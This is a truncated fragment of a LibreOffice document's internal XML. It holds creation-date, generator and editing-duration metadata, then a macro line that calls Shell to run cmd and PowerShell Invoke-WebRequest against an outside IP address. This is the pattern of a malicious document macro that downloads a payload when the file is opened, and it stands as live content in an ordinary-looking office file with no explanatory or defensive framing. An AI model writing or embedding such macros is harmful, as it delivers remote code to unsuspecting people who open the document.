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22:50:01.472910813</meta:creation-date>
    <meta:generator>LibreOffice/7.2.2.2$Linux_X86_64 LibreOffice_project/20$Build-2</meta:generator>
    <dc:date>2021-11-04T00:04:25.118581861</dc:date>
    <meta:editing-duration>PT1H14M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Shell("cmd /c powershell iwr 192.168.49.167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